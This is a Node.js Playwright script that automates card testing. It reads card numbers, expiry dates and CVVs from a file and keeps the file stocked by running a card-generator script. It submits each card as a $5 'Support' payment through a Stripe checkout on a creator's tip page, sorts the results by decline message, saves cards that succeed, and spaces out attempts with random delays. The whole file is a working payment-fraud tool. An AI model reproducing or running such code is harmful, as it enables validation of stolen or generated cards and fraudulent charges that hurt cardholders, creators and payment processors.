const { chromium } = require('playwright');
const fs = require('fs');
const readline = require('readline');
const { spawn } = require('child_process');

// Function to read cards from cards.txt in the specified format
function readCardsFromFile(filePath) {
    const cards = [];
    const data = fs.readFileSync(filePath, 'utf8');

    data.split('\n').forEach((line) => {
        const parts = line.split('|');
        if (parts.length === 4) {
            const card = {
                number: parts[0],
                expiry_month: parts[1],
                expiry_year: parts[2],
                cvv: parts[3]
            };
            cards.push(card);
        }
    });
    return cards;
}

// Function to save remaining cards to cards.txt
function saveCardsToFile(filePath, cards) {
    const data = cards.map(card => `${card.number}|${card.expiry_month}|${card.expiry_year}|${card.cvv}`).join('\n');
    fs.writeFileSync(filePath, data, 'utf8');
}

// Function to log successful payments to a text file
function logSuccessfulPayment(card) {
    const successfulCardInfo = `${card.number}|${card.expiry_month}|${card.expiry_year}|${card.cvv}\n`;
    fs.appendFileSync('successful_payments.txt', successfulCardInfo);
    console.log(`✅ Card saved to successful_payments.txt: ${successfulCardInfo.trim()}`);
}

// Function to start the card generator in the background
let cardGeneratorProcess = null;
function startCardGenerator() {
    if (!cardGeneratorProcess) {
        console.log("⚙️ Starting card generator...");
        cardGeneratorProcess = spawn('python3', ['cardgenerater.py'], { detached: true });
    }
}

// Function to stop the card generator process
function stopCardGenerator() {
    if (cardGeneratorProcess) {
        console.log("🛑 Stopping card generator...");
        process.kill(-cardGeneratorProcess.pid);
        cardGeneratorProcess = null;
    }
}

// Monitor cards.txt and manage card generation
function monitorCardsFile() {
    fs.watch('cards.txt', (eventType) => {
        if (eventType === 'change') {
            const cardCount = readCardsFromFile('cards.txt').length;

            if (cardCount <= 50) {
                startCardGenerator(); // Start generating cards if below threshold
            } else if (cardCount >= 1000000) {
                stopCardGenerator(); // Stop generating cards when threshold is reached
            }
        }
    });
}

// Automate browser interaction for payment simulation
async function simulatePayment(card, influencerUrl, gmailAddress) {
    const browser = await chromium.launch({
        headless: true,
        args: [
            '--enable-unsafe-swiftshader',
            '--disable-web-security',
            '--allow-file-access-from-files'
        ]
    });
    const page = await browser.newPage();

    try {
        await page.goto(influencerUrl, { timeout: 60000 });

        await page.waitForSelector('text="Support $5"');
        await page.click('text="Support $5"');

        // Fill in email
        await page.fill('input[placeholder="Email"]', gmailAddress);
        await page.click('button:has-text("Pay")');
        await page.waitForTimeout(5000);

        const stripeFrame = await page.waitForSelector('iframe[name^="__privateStripeFrame"]', { timeout: 20000 });
        const frame = await stripeFrame.contentFrame();

        console.log(`Using card: ${card.number}, Expiry: ${card.expiry_month}/${card.expiry_year}, CVV: ${card.cvv}`);

        await frame.fill('input[name="cardnumber"]', card.number);
        await frame.fill('input[name="exp-date"]', `${card.expiry_month}/${card.expiry_year}`);
        await frame.fill('input[name="cvc"]', card.cvv);

        if (await frame.isVisible('input[name="postal"]')) {
            await frame.fill('input[name="postal"]', '100080');
        }

        await page.click('button:has-text("Pay with Card")');
        await page.waitForTimeout(15000);

        const bodyContent = await page.textContent('body');

        // Specific checks for payment failures
        if (bodyContent.includes("Your card number is incorrect.")) {
            console.log("❌ Card number is incorrect.");
            await browser.close();
            return { success: false, reason: "Card number is incorrect" };
        }

        if (bodyContent.includes("Your card has been declined")) {
            console.log("❌ Card was declined.");
            await browser.close();
            return { success: false, reason: "Card was declined" };
        }

        if (
            bodyContent.includes("We are unable to authenticate your payment method.") ||
            bodyContent.includes("Authentication Failed")
        ) {
            console.log("❌ Authentication failed or card declined.");
            await browser.close();
            return { success: false, reason: "Authentication failed or card declined" };
        }

        // Success case: Payment completed
        if (
            bodyContent.includes("You bought") &&
            bodyContent.includes("a coffee!") &&
            bodyContent.includes("Thank you for supporting")
        ) {
            logSuccessfulPayment(card);
            await browser.close();
            return { success: true, reason: "Payment successful" };
        }

        // Log unknown failures with content for debugging
        console.log(`❌ Unknown failure. Page content:\n${bodyContent}`);
        await browser.close();
        return { success: false, reason: "Unknown failure" };
    } catch (error) {
        console.error(`Error during payment processing: ${error.message}`);
        await browser.close();
        return { success: false, reason: "Error during payment processing" };
    }
}

// Main function to run the script
async function main() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('Enter your Gmail address: ', async (gmailAddress) => {
        rl.question('Enter the influencer URL: ', async (influencerUrl) => {
            monitorCardsFile(); // Start monitoring cards.txt
            let cards = readCardsFromFile('cards.txt');

            for (const card of cards) {
                const result = await simulatePayment(card, influencerUrl, gmailAddress);

                if (result.success) {
                    console.log(`✅ Payment successful: ${result.reason}`);
                } else {
                    console.log(`❌ Payment failed: ${result.reason}`);
                }

                cards = cards.filter(c => c.number !== card.number);
                saveCardsToFile('cards.txt', cards);

                const delay = Math.floor(Math.random() * 6) + 10;
                await new Promise(resolve => setTimeout(resolve, delay * 1000));
            }

            rl.close();
        });
    });
}

// Run the main function
main();
